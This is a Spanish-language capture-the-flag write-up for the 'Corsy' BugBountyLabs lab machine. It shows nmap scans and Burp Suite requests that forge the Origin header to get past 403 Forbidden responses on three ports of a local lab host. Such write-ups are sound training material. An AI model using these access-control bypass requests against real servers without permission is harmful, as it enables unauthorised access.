---
icon: flag
---

# Corsy BugBountyLabs (Avanzado)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip bugbountylabs_corsy.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
python3 bugbountylabs_corsy.py
```

Info:

```
██████╗ ██╗   ██╗ ██████╗     ██████╗  ██████╗ ██╗   ██╗███╗   ██╗████████╗██╗   ██╗    ██╗      █████╗ ██████╗ ███████╗
██╔══██╗██║   ██║██╔════╝     ██╔══██╗██╔═══██╗██║   ██║████╗  ██║╚══██╔══╝╚██╗ ██╔╝    ██║     ██╔══██╗██╔══██╗██╔════╝
██████╔╝██║   ██║██║  ███╗    ██████╔╝██║   ██║██║   ██║██╔██╗ ██║   ██║    ╚████╔╝     ██║     ███████║██████╔╝███████╗
██╔══██╗██║   ██║██║   ██║    ██╔══██╗██║   ██║██║   ██║██║╚██╗██║   ██║     ╚██╔╝      ██║     ██╔══██║██╔══██╗╚════██║
██████╔╝╚██████╔╝╚██████╔╝    ██████╔╝╚██████╔╝╚██████╔╝██║ ╚████║   ██║      ██║       ███████╗██║  ██║██████╔╝███████║
╚═════╝  ╚═════╝  ╚═════╝     ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝   ╚═╝      ╚═╝       ╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝

Fundadores
El Pingüino de Mario
Curiosidades De Hackers

Cofundadores
Zunderrub
CondorHacks
Lenam

Descargando la máquina corsy, espere por favor...

[########################################] 100%
Descarga completa.
La IP de la máquina corsy es -> 172.17.0.2

Presiona Ctrl+C para detener la máquina
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 08:38 CET
Nmap scan report for app.dl (172.17.0.2)
Host is up (0.000029s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.62
|_http-title: Did not follow redirect to http://corsy.lab//
|_http-server-header: Apache/2.4.62 (Debian)
8080/tcp open  http    Apache httpd 2.4.62
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: 403 Forbidden
9090/tcp open  http    Apache httpd 2.4.62
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: 403 Forbidden
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Hosts: corsy.lab, 172.17.0.2

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.66 seconds
```

Vemos varios puertos, por lo que podemos deducir que pueden ser varios niveles, por lo que empezaremos por el puerto `80`.

## Puerto 80

Vemos que cuando entramos requiere un dominio llamado `corsy.lab` por lo que vamos añadirlo a nuestro archivo `hosts`.

```shell
nano /etc/hosts

#Dentro del nano
<IP>                corsy.lab
```

Lo guardamos y volvemos a entrar a la pagina, veremos que nos muestra un `403 Forbidden`, nuestro objetivo es que podamos visualizar la pagina, por lo que vamos a realizar algun `bypass` realizando la tecnica de `CORS` poniendo en el `Origin` nuestra `IP` para que nos permita el servidor nuestra entrada, pero tendremos que ponerlo mediante el mismo dominio de la pagina, ya que nos esta realizando la resolucion `DNS` mediante nuestra `IP` y tendremos que poner en el `Accept: */*`.

Vamos abrir `BurpSuite`, capturar la peticion recargando la pagina y dejar la peticion de esta forma con el `Origin`.

```
GET // HTTP/1.1
Host: corsy.lab
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Origin: http://corsy.lab
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

Ahora si vamos a la pagina despues de enviar la peticion veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (322).png" alt=""><figcaption></figcaption></figure>

## Puerto 8080

Si hacemos exactamente lo mismo de antes, realizando la misma peticion con el `Origin` y el `Accept` veremos que tambien funciona:

```
GET / HTTP/1.1
Host: corsy.lab:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Origin: http://corsy.lab
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Wed, 22 Jan 2025 09:17:34 GMT
If-None-Match: "f66-62c47f6bac780-gzip"
Priority: u=0, i

```

Enviando esta peticion mediante `BurpSuite` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>

## Puerto 9090

Si hacemos lo mismo de antes:

```
GET / HTTP/1.1
Host: corsy.lab:9090
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Origin: http://corsy.lab
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

Veremos que ya no nos deja, pero si probamos a poner `Origin: https://corsy.lab` en `HTTPS` en vez de en `HTTP` veremos que nos deja, ya que por algun motivo nos esta bloqueando el acceso mediante `HTTP`:

```
GET / HTTP/1.1
Host: corsy.lab:9090
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Origin: https://corsy.lab
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

Ahora si enviamos esa peticion, veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>

Vemos que nos ha funcionado, por lo que ya habremos terminado la maquina, aprovechando diferentes vulnerabilidades `CORS`.
